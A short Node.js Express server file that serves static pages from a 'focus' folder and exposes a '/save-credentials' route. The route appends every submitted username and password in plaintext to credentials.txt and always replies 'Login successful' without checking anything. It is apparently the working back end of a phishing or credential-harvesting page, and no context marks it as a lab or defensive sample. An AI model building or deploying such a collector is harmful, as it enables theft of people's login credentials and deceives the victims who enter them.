const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');
const app = express();
const port = 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Serve static files from the focus directory
app.use(express.static(path.join(__dirname, 'focus')));

// Route to handle login form submission
app.post('/save-credentials', (req, res) => {
  const { username, password } = req.body;
  
  if (!username || !password) {
    return res.status(400).json({ success: false, message: 'Username and password are required' });
  }
  
  // Append credentials to file
  const credentials = `${username},${password},${new Date().toISOString()}\n`;
  
  fs.appendFile(path.join(__dirname, 'credentials.txt'), credentials, (err) => {
    if (err) {
      console.error('Error saving credentials:', err);
      return res.status(500).json({ success: false, message: 'Server error' });
    }
    
    // Return success response
    res.json({ 
      success: true, 
      message: 'Login successful',
    });
  });
});

// Start the server
app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
}); 